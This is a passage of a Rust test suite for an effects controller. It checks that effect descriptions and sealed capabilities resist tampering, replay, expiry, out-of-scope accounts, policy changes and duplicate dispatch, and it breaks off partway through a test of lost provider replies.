//! Scenario tests for the effects module (VM part §2.5, §4.5, §4.6, §6.3, §9.2 VM-N2,
//! VM-W31, VM-P13, VM-P14, VM-P30–VM-P33, §12.3 models 2 and 4, VM-D12).

use std::collections::{BTreeMap, BTreeSet};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use serde_json::json;

use super::budget::{
    ChannelKey, ReleaseChannelKind, ReleaseLedger, ReleaseRefusalReason, TrustClass, WireMeasure,
    DEFAULT_GENERAL_RELEASE_BUDGET_BYTES,
};
use super::canonical::{CanonicalValue, Parameters, RawParameters, RawValue};
use super::capability::{
    AuthorizationBasis, BoundField, CapabilityKey, CapabilityRefusal, ExecutorName,
    SealedCapability,
};
use super::contract::{ContractRefusal, ContractRegistry, DeliveryGuarantee, PayloadRule};
use super::controller::{AuthorizationRequest, EffectController, EffectError};
use super::delegation::{
    AuthorizationBook, BudgetRefusal, IndividualApproval, MaterialChange, ScopeChange,
    ScopeViolation,
};
use super::description::{
    AttachmentName, Deadline, EffectDescription, EffectFields, IdempotencyRequirement,
    OperationName, Precondition, ReviewedArtifact,
};
use super::executor::{EffectExecutor, ExecutorOutcome, ExecutorRefusal, TypedOperation};
use super::experiment::{run_mutation_corpus, ApprovalMode};
use super::fakes::*;
use super::models::{check_budget_model, check_effect_model, BudgetModelBounds, EffectModelBounds};
use super::replay::ReplayRefusal;
use super::revocation::{AckRefusal, EnforcementPoint, RevocationAck};
use super::secrets::{CredentialHandle, CredentialRefusal, ExternalCredential, ShortLivedTerms};
use super::state::{
    EffectFailure, EffectPhase, EffectState, Observation, Reconciliation, ReconciliationSource,
    StateRefusal, UnknownCause,
};
use crate::foundation::events::{AuditEntry, HostFact, RevocationReason};
use crate::foundation::evidence::{ClockSession, SourceClass};
use crate::foundation::ids::{
    digest, AuthorizationEpoch, ContentKey, MonotonicTime, PolicyEpoch, SandboxBootGeneration,
};
use crate::foundation::transfer::CredentialRef;

fn hex(tag: &str) -> String {
    digest("yougori/test/other/v1", &[tag.as_bytes()]).to_hex()
}

fn id_of(fields: EffectFields) -> super::description::EffectId {
    EffectDescription::new(fields).unwrap().id()
}

// ---------------------------------------------------------------------------------------
// The immutable description (§9.2 line 2344; VM-P30)
// ---------------------------------------------------------------------------------------

/// VM-P30: every bound field changes the identity, and no two mutations collide.
#[test]
fn mutating_every_bound_description_field_changes_the_identity() {
    type Mutation = fn(&mut EffectFields);
    let mutations: Vec<(&str, Mutation)> = vec![
        ("principal", |f| {
            f.principal = crate::foundation::ids::TenantId::new("tenant-b").unwrap()
        }),
        ("sandbox issuer", |f| {
            f.sandbox.issuer =
                super::description::IssuerId::new(digest("yougori/test/i/v1", &[b"2"]))
        }),
        ("sandbox execution", |f| {
            f.sandbox.execution = execution("exe-b")
        }),
        ("provider", |f| {
            f.operation.provider = super::description::ProviderId::new("other").unwrap()
        }),
        ("operation", |f| {
            f.operation.operation = OperationName::new("close_change_request").unwrap()
        }),
        ("contract version", |f| f.operation.contract_version = 2),
        ("account", |f| f.resource.account = account("org-b")),
        ("object", |f| {
            f.resource.object = digest("yougori/test/object/v1", &[b"repo-b"])
        }),
        ("route", |f| f.destination.route = route("mirror")),
        ("trust class", |f| {
            f.destination.trust = TrustClass::PublicNetwork
        }),
        ("parameter value", |f| {
            f.parameters = f
                .parameters
                .clone()
                .with(param("title"), CanonicalValue::Text("Fix the lexer".into()))
        }),
        ("extra parameter", |f| {
            f.parameters = f
                .parameters
                .clone()
                .with(param("priority"), CanonicalValue::Integer(1))
        }),
        ("payload content", |f| {
            f.payload = Some(payload(b"other bytes"))
        }),
        ("payload length", |f| {
            f.payload = Some(super::description::PayloadRef {
                content: ContentKey::of(PAYLOAD),
                length_bytes: 1,
            })
        }),
        ("payload removed", |f| f.payload = None),
        ("attachment added", |f| {
            f.attachments
                .insert(AttachmentName::new("diagram").unwrap(), payload(ATTACHMENT));
        }),
        ("precondition", |f| {
            f.preconditions.insert(Precondition::Present);
        }),
        ("maximum spend", |f| f.max_cost.max_spend_microunits += 1),
        ("maximum volume", |f| f.max_cost.max_volume_units += 1),
        ("wire bytes", |f| f.max_wire_bytes_out += 1),
        ("deadline clock", |f| {
            f.deadline.clock = ClockSession::from_uuid(uuid::Uuid::from_u128(0xe2))
        }),
        ("deadline", |f| {
            f.deadline.at = f.deadline.at.saturating_add(SECOND)
        }),
        ("idempotency key", |f| {
            f.idempotency.key =
                super::description::IdempotencyKey::new(digest("yougori/test/k/v1", &[b"2"]))
        }),
        ("idempotency requirement", |f| {
            f.idempotency.requirement = IdempotencyRequirement::NoExactlyOnce
        }),
    ];
    let base = id_of(fields());
    let mut seen = BTreeSet::from([base]);
    for (label, mutate) in mutations {
        let mut changed = fields();
        mutate(&mut changed);
        let id = id_of(changed);
        assert_ne!(id, base, "{label}");
        assert!(seen.insert(id), "{label} collides with another mutation");
    }
}

/// VM-P30: reorderings of things whose order carries no meaning keep the identity;
/// reordering an ordered list does not.
#[test]
fn canonical_equivalent_reorderings_keep_the_identity() {
    let contract = contract();
    let a = contract
        .normalize(
            &RawParameters::from_json(
                r#"{"title": "Fix", "labels": ["bug", "parser"], "commits": ["AA", "bb"]}"#
                    .replace("\"AA\"", &format!("\"{}\"", hex("1").to_uppercase()))
                    .replace("\"bb\"", &format!("\"{}\"", hex("2")))
                    .as_str(),
            )
            .unwrap(),
        )
        .unwrap();
    let b = contract
        .normalize(
            &RawParameters::from_json(
                r#"{"commits": ["aa", "bb"], "labels": ["parser", "bug"], "title": "Fix"}"#
                    .replace("\"aa\"", &format!("\"{}\"", hex("1")))
                    .replace("\"bb\"", &format!("\"{}\"", hex("2")))
                    .as_str(),
            )
            .unwrap(),
        )
        .unwrap();
    // Key order, unordered-list order and digest letter case are canonical equivalents.
    assert_eq!(a, b);
    let with = |parameters: Parameters| {
        let mut f = fields();
        f.parameters = parameters;
        id_of(f)
    };
    assert_eq!(with(a.clone()), with(b));
    let reordered_commits = contract
        .normalize(
            &RawParameters::from_json(
                r#"{"title": "Fix", "labels": ["bug", "parser"], "commits": ["bb", "aa"]}"#
                    .replace("\"aa\"", &format!("\"{}\"", hex("1")))
                    .replace("\"bb\"", &format!("\"{}\"", hex("2")))
                    .as_str(),
            )
            .unwrap(),
        )
        .unwrap();
    assert_ne!(with(a), with(reordered_commits));

    // Attachments and preconditions are sets, whatever order they were added in.
    let mut one = fields();
    one.attachments
        .insert(AttachmentName::new("diagram").unwrap(), payload(ATTACHMENT));
    one.attachments
        .insert(AttachmentName::new("notes").unwrap(), payload(b"notes"));
    one.preconditions.insert(Precondition::Present);
    one.preconditions.insert(Precondition::MatchesVersion {
        version: digest("yougori/test/etag/v1", &[b"7"]),
    });
    let mut two = fields();
    two.preconditions.insert(Precondition::MatchesVersion {
        version: digest("yougori/test/etag/v1", &[b"7"]),
    });
    two.preconditions.insert(Precondition::Present);
    two.attachments
        .insert(AttachmentName::new("notes").unwrap(), payload(b"notes"));
    two.attachments
        .insert(AttachmentName::new("diagram").unwrap(), payload(ATTACHMENT));
    assert_eq!(id_of(one), id_of(two));
}

#[test]
fn descriptions_refuse_inconsistent_fields_and_recompute_identity_when_read() {
    use super::description::DescriptionError;
    let mut zero = fields();
    zero.max_wire_bytes_out = 0;
    assert_eq!(
        EffectDescription::new(zero),
        Err(DescriptionError::ZeroWireBudget)
    );
    let mut small = fields();
    small.max_wire_bytes_out = 3;
    assert_eq!(
        EffectDescription::new(small),
        Err(DescriptionError::WireBudgetBelowContent {
            content_bytes: PAYLOAD.len() as u64,
            max_wire_bytes_out: 3
        })
    );
    let mut needs = fields();
    needs.idempotency.requirement = IdempotencyRequirement::Precondition;
    assert_eq!(
        EffectDescription::new(needs),
        Err(DescriptionError::PreconditionRequirementWithoutPreconditions)
    );

    let description = description();
    let json = serde_json::to_value(&description).unwrap();
    assert_eq!(
        serde_json::from_value::<EffectDescription>(json.clone()).unwrap(),
        description
    );
    let mut edited = json.clone();
    edited["max_wire_bytes_out"] = json!(5_000);
    let read: EffectDescription = serde_json::from_value(edited).unwrap();
    assert_ne!(read.id(), description.id());
    let mut extra = json;
    extra["approved_by"] = json!("guest");
    assert!(serde_json::from_value::<EffectDescription>(extra).is_err());
}

/// §4.6 line 2024: HTTP verbs are not intent classification.
#[test]
fn an_http_verb_is_never_an_operation_name() {
    for verb in [
        "POST", "get", "Delete", "PATCH", "put", "head", "OPTIONS", "trace", "connect",
    ] {
        assert!(
            matches!(
                OperationName::new(verb),
                Err(super::description::OperationNameError::HttpVerb { .. })
            ),
            "{verb}"
        );
        assert!(serde_json::from_value::<OperationName>(json!(verb)).is_err());
    }
    assert!(OperationName::new("create_pull_request").is_ok());
    assert!(OperationName::new("post_comment").is_ok());
}

/// §4.6 line 2022: the displayed artifact and the outbound payload share one digest,
/// and approval never covers a name whose bytes change afterwards.
#[test]
fn a_reviewed_artifact_must_be_exactly_the_outbound_payload() {
    let description = description();
    let deadline = Deadline {
        clock: SESSION,
        at: START.saturating_add(HOUR),
    };
    let shown = ReviewedArtifact::of_displayed(PAYLOAD);
    assert!(IndividualApproval::for_description(
        &description,
        Some(shown),
        PolicyEpoch::FIRST,
        deadline
    )
    .is_ok());
    let other = ReviewedArtifact::of_displayed(b"a different diff");
    assert_eq!(
        IndividualApproval::for_description(
            &description,
            Some(other),
            PolicyEpoch::FIRST,
            deadline
        ),
        Err(ScopeViolation::ReviewedArtifactMismatch)
    );
    assert!(shown.check_outbound(PAYLOAD).is_ok());
    let changed = shown.check_outbound(b"diff --git a/parser.rs b/parser.rs\n+evil\n");
    assert_eq!(changed.unwrap_err().expected, ContentKey::of(PAYLOAD));
}

// ---------------------------------------------------------------------------------------
// Operation contracts (§4.6 line 2024; §9.2 line 2361)
// ---------------------------------------------------------------------------------------

#[test]
fn contracts_normalize_and_refuse_out_of_contract_parameters() {
    let contract = contract();
    let refuse = |json: &str| contract.normalize(&RawParameters::from_json(json).unwrap());
    assert_eq!(
        refuse(r#"{"title": "x", "verb": "POST"}"#),
        Err(ContractRefusal::UnknownParameter {
            name: "verb".into()
        })
    );
    assert_eq!(
        refuse(r#"{"draft": true}"#),
        Err(ContractRefusal::MissingParameter {
            name: param("title")
        })
    );
    assert_eq!(
        refuse(r#"{"title": 3}"#),
        Err(ContractRefusal::WrongKind {
            name: param("title")
        })
    );
    assert_eq!(
        refuse(&format!(r#"{{"title": "{}"}}"#, "x".repeat(201))),
        Err(ContractRefusal::TextTooLong {
            name: param("title"),
            max_bytes: 200
        })
    );
    assert_eq!(
        refuse(r#"{"title": "a\u0007b"}"#),
        Err(ContractRefusal::ControlCharacter {
            name: param("title")
        })
    );
    assert_eq!(
        refuse(r#"{"title": "x", "priority": 6}"#),
        Err(ContractRefusal::IntegerOutOfRange {
            name: param("priority")
        })
    );
    assert_eq!(
        refuse(r#"{"title": "x", "labels": ["a", "b", "c", "d", "e"]}"#),
        Err(ContractRefusal::TooManyItems {
            name: param("labels"),
            max_items: 4
        })
    );
    assert_eq!(
        refuse(r#"{"title": "x", "labels": ["a", "a"]}"#),
        Err(ContractRefusal::DuplicateItem {
            name: param("labels")
        })
    );
    assert_eq!(
        refuse(r#"{"title": "x", "commits": ["not-a-digest"]}"#),
        Err(ContractRefusal::InvalidDigest {
            name: param("commits")
        })
    );
    let normalized = contract
        .normalize(&RawParameters::new().with("title", RawValue::Text("ok".into())))
        .unwrap();
    assert_eq!(normalized.len(), 1);
}

/// §9.2 line 2361: providers without idempotency or checkable preconditions cannot
/// receive an exactly-once promise.
#[test]
fn no_exactly_once_promise_without_idempotency_or_checkable_preconditions() {
    let mut bare = contract();
    bare.provider_key = false;
    bare.checkable_preconditions = false;
    for requirement in [
        IdempotencyRequirement::ProviderKey,
        IdempotencyRequirement::Precondition,
    ] {
        assert_eq!(
            bare.delivery(requirement),
            Err(ContractRefusal::ExactlyOnceUnavailable { requirement })
        );
    }
    let delivery = bare
        .delivery(IdempotencyRequirement::NoExactlyOnce)
        .unwrap();
    assert_eq!(delivery, DeliveryGuarantee::NoExactlyOnce);
    assert!(!delivery.promises_exactly_once());

    let keyed = contract();
    assert_eq!(
        keyed.delivery(IdempotencyRequirement::ProviderKey),
        Ok(DeliveryGuarantee::ExactlyOnceByProviderKey)
    );
    assert_eq!(
        keyed.delivery(IdempotencyRequirement::Precondition),
        Ok(DeliveryGuarantee::ExactlyOnceByPrecondition)
    );
    // A description that asks for a key the bare contract cannot honour fails validation.
    let mut bare_registry_contract = bare.clone();
    bare_registry_contract.operation = operation("open_change_request");
    assert_eq!(
        bare_registry_contract.validate(&description()),
        Err(ContractRefusal::ExactlyOnceUnavailable {
            requirement: IdempotencyRequirement::ProviderKey
        })
    );
}

#[test]
fn contract_validation_refuses_routes_payloads_attachments_and_cost() {
    let contract = contract();
    let check = |mutate: fn(&mut EffectFields)| {
        let mut f = fields();
        mutate(&mut f);
        contract.validate(&EffectDescription::new(f).unwrap())
    };
    assert_eq!(
        check(|_| {}),
        Ok(DeliveryGuarantee::ExactlyOnceByProviderKey)
    );
    assert_eq!(
        check(|f| f.destination.route = route("mirror")),
        Err(ContractRefusal::RouteNotInContract)
    );
    assert_eq!(
        check(|f| f.destination.trust = TrustClass::PublicNetwork),
        Err(ContractRefusal::TrustClassMismatch)
    );
    assert_eq!(
        check(|f| {
            f.attachments
                .insert(AttachmentName::new("binary").unwrap(), payload(b"x"));
        }),
        Err(ContractRefusal::UnknownAttachment {
            name: AttachmentName::new("binary").unwrap()
        })
    );
    assert_eq!(
        check(|f| f.max_cost.max_spend_microunits = 1_000_001),
        Err(ContractRefusal::CostAboveContract)
    );
    assert_eq!(
        check(|f| f.operation = operation("close_change_request")),
        Err(ContractRefusal::OperationMismatch)
    );
    assert_eq!(
        check(|f| {
            f.parameters = f
                .parameters
                .clone()
                .with(param("labels"), CanonicalValue::List(vec![]))
        }),
        Err(ContractRefusal::WrongKind {
            name: param("labels")
        })
    );
    let mut forbidden = contract.clone();
    forbidden.payload = PayloadRule::Forbidden;
    assert_eq!(
        forbidden.validate(&description()),
        Err(ContractRefusal::PayloadForbidden)
    );
    let mut required = contract.clone();
    required.payload = PayloadRule::Required;
    let mut without = fields();
    without.payload = None;
    assert_eq!(
        required.validate(&EffectDescription::new(without).unwrap()),
        Err(ContractRefusal::PayloadRequired)
    );
    let mut unchecked = contract;
    unchecked.checkable_preconditions = false;
    let mut with_precondition = fields();
    with_precondition.preconditions.insert(Precondition::Absent);
    assert_eq!(
        unchecked.validate(&EffectDescription::new(with_precondition).unwrap()),
        Err(ContractRefusal::PreconditionsUncheckable)
    );
    assert_eq!(
        ContractRegistry::new()
            .get(&operation("open_change_request"))
            .unwrap_err(),
        ContractRefusal::UnknownOperation
    );
}

// ---------------------------------------------------------------------------------------
// Capabilities (§4.6 lines 2016–2020; VM-P13, VM-P30)
// ---------------------------------------------------------------------------------------

fn tamper(sealed: &SealedCapability, path: &[&str], value: serde_json::Value) -> SealedCapability {
    let mut json = serde_json::to_value(sealed).unwrap();
    let mut slot = &mut json["capability"];
    for key in path {
        slot = &mut slot[*key];
    }
    assert!(!slot.is_null(), "{path:?} is not a capability field");
    *slot = value;
    serde_json::from_value(json).unwrap()
}

fn authorized_capability() -> (World, super::description::EffectId, SealedCapability) {
    let mut world = World::new();
    let id = world.controller.propose(description()).unwrap();
    world.controller.validate(&id).unwrap();
    let request = world.request();
    let sealed = world.controller.authorize(&id, request).unwrap();
    (world, id, sealed)
}

/// VM-P30: mutating any bound capability field breaks the seal.
#[test]
fn mutating_any_capability_field_breaks_the_seal() {
    let (_, _, sealed) = authorized_capability();
    let key = key();
    assert!(key.verify(&sealed).is_ok());
    let mutations: Vec<(&[&str], serde_json::Value)> = vec![
        (&["effect"], json!(hex("effect"))),
        (&["principal"], json!("tenant-b")),
        (&["sandbox", "issuer"], json!(hex("issuer"))),
        (&["sandbox", "execution"], json!("exe-b")),
        (&["generations", "boot"], json!(2)),
        (&["generations", "policy"], json!(2)),
        (&["generations", "authorization"], json!(2)),
        (&["policy_version"], json!(hex("policy"))),
        (&["executor", "name"], json!("other-executor")),
        (&["executor", "build"], json!(hex("build"))),
        (&["lease"], json!(99)),
        (&["operation", "provider"], json!("mirror")),
        (&["operation", "operation"], json!("close_change_request")),
        (&["operation", "contract_version"], json!(2)),
        (&["resource", "account"], json!(hex("account"))),
        (&["resource", "object"], json!(hex("object"))),
        (&["destination", "route"], json!(hex("route"))),
        (&["destination", "trust"], json!("public_network")),
        (&["payload", "content"], json!(hex("payload"))),
        (&["payload", "length_bytes"], json!(1)),
        (&["attachments"], json!(hex("attachments"))),
        (&["max_cost", "max_spend_microunits"], json!(999_999)),
        (&["max_cost", "max_volume_units"], json!(9)),
        (&["clock"], json!("00000000-0000-0000-0000-000000000099")),
        (&["expires_at"], json!(u64::MAX)),
        (&["nonce"], json!(77)),
        (&["idempotency", "key"], json!(hex("idempotency"))),
        (&["idempotency", "requirement"], json!("no_exactly_once")),
        (&["attempt"], json!(9)),
        (&["basis", "delegation"], json!(hex("delegation"))),
    ];
    for (path, value) in mutations {
        let forged = tamper(&sealed, path, value);
        assert_eq!(
            key.verify(&forged),
            Err(CapabilityRefusal::Tampered),
            "{path:?}"
        );
    }
    // Another key never verifies a seal either.
    let other = CapabilityKey::new(&[0x43; 32]).unwrap();
    assert_eq!(other.verify(&sealed), Err(CapabilityRefusal::Tampered));
}

#[test]
fn a_capability_checks_every_copied_field_against_its_description() {
    let (_, _, sealed) = authorized_capability();
    let capability = sealed.capability();
    assert!(capability.check_binding(&description()).is_ok());
    type Mutation = fn(&mut EffectFields);
    let cases: Vec<(BoundField, Mutation)> = vec![
        (BoundField::Effect, |f| f.max_wire_bytes_out += 1),
        (BoundField::Effect, |f| {
            f.deadline.at = f.deadline.at.saturating_add(SECOND)
        }),
    ];
    for (field, mutate) in cases {
        let mut f = fields();
        mutate(&mut f);
        assert_eq!(
            capability.check_binding(&EffectDescription::new(f).unwrap()),
            Err(CapabilityRefusal::FieldMismatch { field })
        );
    }
    // With the effect identity copied over, each remaining field is still compared.
    let other_fields: Vec<(BoundField, Mutation)> = vec![
        (BoundField::Principal, |f| {
            f.principal = crate::foundation::ids::TenantId::new("tenant-b").unwrap()
        }),
        (BoundField::Sandbox, |f| {
            f.sandbox.execution = execution("exe-b")
        }),
        (BoundField::Operation, |f| {
            f.operation = operation("close_change_request")
        }),
        (BoundField::Resource, |f| {
            f.resource.account = account("org-b")
        }),
        (BoundField::Destination, |f| {
            f.destination.route = route("mirror")
        }),
        (BoundField::Payload, |f| f.payload = None),
        (BoundField::Attachments, |f| {
            f.attachments
                .insert(AttachmentName::new("diagram").unwrap(), payload(ATTACHMENT));
        }),
        (BoundField::MaxCost, |f| f.max_cost.max_volume_units += 1),
        (BoundField::Idempotency, |f| {
            f.idempotency.requirement = IdempotencyRequirement::NoExactlyOnce
        }),
    ];
    for (field, mutate) in other_fields {
        let mut f = fields();
        mutate(&mut f);
        let changed = EffectDescription::new(f).unwrap();
        let mut copy = capability.clone();
        copy.effect = changed.id();
        assert_eq!(
            copy.check_binding(&changed),
            Err(CapabilityRefusal::FieldMismatch { field }),
            "{field:?}"
        );
    }
}

#[test]
fn capability_keys_refuse_short_secrets_and_never_print_them() {
    assert_eq!(
        CapabilityKey::new(&[1; 31]).unwrap_err(),
        CapabilityRefusal::KeyTooShort { min_bytes: 32 }
    );
    assert_eq!(format!("{:?}", key()), "CapabilityKey(..)");
}

// ---------------------------------------------------------------------------------------
// The controller: the durable state machine end to end (§9.2; VM-W31)
// ---------------------------------------------------------------------------------------

#[test]
fn the_pipeline_confirms_with_a_receipt_bound_to_the_description_and_the_result() {
    let mut world = World::new();
    let (id, outcome) = world.run(description());
    assert_eq!(outcome.phase, EffectPhase::Confirmed);
    let record = world.controller.record(&id).unwrap();
    let EffectState::Confirmed {
        capability,
        receipt,
        ..
    } = record.state()
    else {
        panic!("not confirmed: {:?}", record.state());
    };
    assert_eq!(outcome.receipt, Some(*receipt));
    assert_eq!(receipt.effect, id);
    assert_eq!(receipt.capability, capability.capability().digest());
    assert_eq!(receipt.attempt, 1);
    // Only the contract's response fields come back; a reflected credential does not.
    let response = outcome.response.unwrap();
    assert_eq!(response.len(), 2);
    assert_eq!(response.get("number"), Some("42"));
    assert_eq!(response.get("authorization"), None);
    assert_eq!(response.get("debug"), None);
    assert_eq!(receipt.provider_result.result, response.digest());
    assert_eq!(receipt.provider_result.spend_microunits, 400);
    assert_eq!(record.history_violation(), None);
    assert_eq!(
        record
            .history()
            .iter()
            .map(|entry| entry.to)
            .collect::<Vec<_>>(),
        vec![
            EffectPhase::Validated,
            EffectPhase::Authorized,
            EffectPhase::Reserved,
            EffectPhase::Dispatched,
            EffectPhase::Confirmed
        ]
    );

    // The executor rebuilt the request from the description; the provider saw a vault
    // reference, never a secret, and the idempotency key went with the request.
    let request = world.provider.last_request().unwrap();
    assert_eq!(request.resource, description().resource());
    assert_eq!(
        request.idempotency_key,
        Some(description().idempotency().key)
    );
    assert_eq!(super::fakes::SharedProvider::calls(&world.provider), 1);
    assert_eq!(
        world.provider.0.lock().unwrap().credentials,
        vec![credential().reference()]
    );

    // Wire bytes count exactly what left; the rest of the reservation returned.
    let sent = outcome.sent.unwrap();
    assert_eq!(sent, request.wire);
    assert!(sent.header_bytes > 0 && sent.url_bytes > 0 && sent.name_bytes == 15);
    let ledger = world.controller.release_ledger();
    assert_eq!(ledger.counted_bytes_out(), sent.total_bytes());
    assert_eq!(ledger.outstanding_reserved_bytes(), 0);
    assert_eq!(
        world
            .controller
            .authorizations()
            .delegation_usage(&world.delegation),
        Some((0, 1, 0, 400))
    );

    // The audit journal holds the authorization decision, the high-impact admission and
    // the external effect's outcome.
    let facts: Vec<HostFact> = world
        .audit_records()
        .iter()
        .filter_map(|record| match record.event().payload() {
            AuditEntry::HostFact { fact, .. } => Some(*fact),
            _ => None,
        })
        .collect();
    assert_eq!(
        facts,
        vec![
            HostFact::AuthorizationDecision,
            HostFact::HighImpactOperation,
            HostFact::ExternalEffect
        ]
    );
    assert_eq!(record.audit_marks().len(), 3);
    assert!(outcome.audited && outcome.persisted);
}

/// VM-P13, VM-P30: a capability replayed for another account or another sandbox has no
/// effect.
#[test]
fn replay_on_another_account_or_sandbox_produces_no_effect() {
    let (mut world, id, sealed) = authorized_capability();
    world.controller.reserve(&id).unwrap();
    for mutate in [
        (|f: &mut EffectFields| f.resource.account = account("org-b")) as fn(&mut EffectFields),
        |f| f.sandbox.execution = execution("exe-b"),
    ] {
        let mut f = fields();
        mutate(&mut f);
        let other = EffectDescription::new(f).unwrap();
        let report = world.executor.execute(
            TypedOperation {
                description: &other,
                capability: &sealed,
                credential: credential(),
            },
            world.controller.now(),
        );
        assert_eq!(
            report.outcome,
            ExecutorOutcome::Refused(ExecutorRefusal::Capability {
                refusal: CapabilityRefusal::FieldMismatch {
                    field: BoundField::Effect
                }
            })
        );
        assert_eq!(report.sent, None);
    }
    assert_eq!(world.provider.calls(), 0);

    // The other sandbox has no authority of its own, so it cannot get a capability.
    let mut f = fields_numbered(2);
    f.sandbox.execution = execution("exe-b");
    let other = world
        .controller
        .propose(EffectDescription::new(f).unwrap())
        .unwrap();
    world.controller.validate(&other).unwrap();
    let request = world.request();
    assert_eq!(
        world.controller.authorize(&other, request),
        Err(EffectError::Refused {
            failure: EffectFailure::NoAuthority
        })
    );
    // A sandbox of another issuer is not this host's to authorize.
    let mut f = fields_numbered(3);
    f.sandbox.issuer = super::description::IssuerId::new(digest("yougori/test/i/v1", &[b"9"]));
    let foreign = world
        .controller
        .propose(EffectDescription::new(f).unwrap())
        .unwrap();
    world.controller.validate(&foreign).unwrap();
    let request = world.request();
    assert_eq!(
        world.controller.authorize(&foreign, request),
        Err(EffectError::Refused {
            failure: EffectFailure::Authorization {
                violation: ScopeViolation::OtherSandbox
            }
        })
    );
}

fn assert_returned(world: &World) {
    assert_eq!(
        world
            .controller
            .release_ledger()
            .outstanding_reserved_bytes(),
        0
    );
    assert_eq!(world.controller.authorizations().outstanding_effects(), 0);
}

/// VM-P13: expired, replayed, wrongly scoped and stale-generation capabilities fail
/// without an external effect.
#[test]
fn expired_replayed_wrongly_scoped_and_stale_capabilities_produce_no_effect() {
    // Expired.
    let mut world = World::new();
    let id = world.prepare(description()).unwrap();
    world.clock.advance(61 * SECOND);
    let outcome = world.dispatch(&id).unwrap();
    assert!(matches!(
        outcome.failure,
        Some(EffectFailure::Capability {
            refusal: CapabilityRefusal::Expired { .. }
        })
    ));
    assert_eq!(outcome.sent, None);
    assert_eq!(world.provider.calls(), 0);
    assert_returned(&world);

    // Replayed: the confirmed capability presented to the executor again.
    let mut world = World::new();
    let (id, _) = world.run(description());
    let record = world.controller.record(&id).unwrap();
    let sealed = record.state().capability().unwrap().clone();
    let replay = world.executor.execute(
        TypedOperation {
            description: record.description(),
            capability: &sealed,
            credential: credential(),
        },
        world.controller.now(),
    );
    assert_eq!(
        replay.outcome,
        ExecutorOutcome::Refused(ExecutorRefusal::Replay {
            refusal: ReplayRefusal::Replayed
        })
    );
    assert_eq!(world.provider.calls(), 1);
    assert_eq!(world.provider.total_commits(), 1);

    // Wrongly scoped: an account outside the delegation.
    let mut world = World::new();
    let mut f = fields();
    f.resource.account = account("org-b");
    let id = world
        .controller
        .propose(EffectDescription::new(f).unwrap())
        .unwrap();
    world.controller.validate(&id).unwrap();
    let request = world.request();
    assert_eq!(
        world.controller.authorize(&id, request),
        Err(EffectError::Refused {
            failure: EffectFailure::Authorization {
                violation: ScopeViolation::NewAccount
            }
        })
    );

    // Stale generation: the sandbox booted again between reservation and dispatch.
    let mut world = World::new();
    let id = world.prepare(description()).unwrap();
    world.authority.reboot(&execution("exe-a"));
    let outcome = world.dispatch(&id).unwrap();
    assert_eq!(
        outcome.failure,
        Some(EffectFailure::BootGenerationChanged {
            bound: SandboxBootGeneration::FIRST,
            current: SandboxBootGeneration::new(2)
        })
    );
    assert_eq!(world.provider.calls(), 0);
    assert_returned(&world);
}

/// Concurrent duplicate dispatch consumes one reservation.
#[test]
fn concurrent_duplicate_dispatch_consumes_one_reservation() {
    let mut world = World::new();
    let id = world.prepare(description()).unwrap();
    let world = Mutex::new(world);
    let results: Vec<Result<_, EffectError>> = std::thread::scope(|scope| {
        let handles: Vec<_> = (0..2)
            .map(|_| scope.spawn(|| world.lock().unwrap().dispatch(&id)))
            .collect();
        handles
            .into_iter()
            .map(|handle| handle.join().unwrap())
            .collect()
    });
    let world = world.into_inner().unwrap();
    assert_eq!(results.iter().filter(|result| result.is_ok()).count(), 1);
    assert!(results.iter().any(|result| matches!(
        result,
        Err(EffectError::State(StateRefusal::AlreadyConfirmed))
    )));
    assert_eq!(world.provider.calls(), 1);
    assert_eq!(
        world
            .controller
            .authorizations()
            .delegation_usage(&world.delegation),
        Some((0, 1, 0, 400))
    );
    // A dispatch of an effect still in flight is refused too.
    let mut lost = World::with(ProviderMode::CommitLoseReply, 64 * 1024, 10);
    let (id, outcome) = lost.run(description());
    assert_eq!(outcome.phase, EffectPhase::OutcomeUnknown);
    assert_eq!(
        lost.dispatch(&id),
        Err(EffectError::State(StateRefusal::NeedsReconciliation))
    );
}

/// The capability expires while its payload is still being buffered.
#[test]
fn expiry_during_buffering_refuses_dispatch_and_returns_the_reservations() {
    let mut world = World::new();
    let id = world.prepare(description()).unwrap();
    // Buffering a large upload takes longer than the capability lasts.
    world.clock.advance(30 * SECOND);
    world.clock.advance(31 * SECOND);
    let outcome = world.dispatch(&id).unwrap();
    assert_eq!(outcome.phase, EffectPhase::Failed);
    assert!(matches!(
        outcome.failure,
        Some(EffectFailure::Capability {
            refusal: CapabilityRefusal::Expired { .. }
        })
    ));
    assert_eq!(world.provider.calls(), 0);
    assert_returned(&world);
    // The same identity can try again, with a fresh capability.
    world.controller.retry(&id).unwrap();
    world.controller.validate(&id).unwrap();
    let request = world.request();
    let sealed = world.controller.authorize(&id, request).unwrap();
    assert_eq!(sealed.capability().attempt, 2);
    world.controller.reserve(&id).unwrap();
    assert_eq!(world.dispatch(&id).unwrap().phase, EffectPhase::Confirmed);
}

/// §9.2 line 2351: the policy epoch is rechecked immediately before dispatch.
#[test]
fn a_policy_epoch_change_just_before_dispatch_refuses() {
    let mut world = World::new();
    let id = world.prepare(description()).unwrap();
    world.authority.raise_policy(&execution("exe-a"));
    let outcome = world.dispatch(&id).unwrap();
    assert_eq!(
        outcome.failure,
        Some(EffectFailure::PolicyEpochChanged {
            bound: PolicyEpoch::FIRST,
            current: PolicyEpoch::new(2)
        })
    );
    assert_eq!(world.provider.calls(), 0);
    assert_returned(&world);
    // The delegation was granted under the old policy, so it must be granted again.
    world.controller.retry(&id).unwrap();
    world.controller.validate(&id).unwrap();
    let lease = world
        .authority
        .issue_lease(&execution("exe-a"), START.saturating_add(HOUR));
    let request = AuthorizationRequest {
        lease,
        ..world.request()
    };
    assert_eq!(
        world.controller.authorize(&id, request),
        Err(EffectError::Refused {
            failure: EffectFailure::Authorization {
                violation: ScopeViolation::PolicyChanged {
                    granted: PolicyEpoch::FIRST,
                    current: PolicyEpoch::new(2)
                }
            }
        })
    );
}

/// VM-P31: the provider commits and the reply is lost. The outcome is reported as
/// uncertain, retries are refused until reconciliation, and nothing commits twice.
#[test]
fn a_partial_commit_gives_outcome_unknown_and_blocks_retry_until_reconciled() {
    let mut world = World::with(ProviderMode::CommitLoseReply, 64 * 1024, 10);
    let (id, outcome) = world.run(description());
    assert_eq!(outcome.phase, EffectPhase::OutcomeUnknown);
    assert!(outcome.sent.is_some());
    let reports = world.controller.uncertain_outcomes();
    assert_eq!(reports.len(), 1);
    assert_eq!(reports[0].effect, id);
    assert_eq!(reports[0].cause, UnknownCause::ResponseLost);
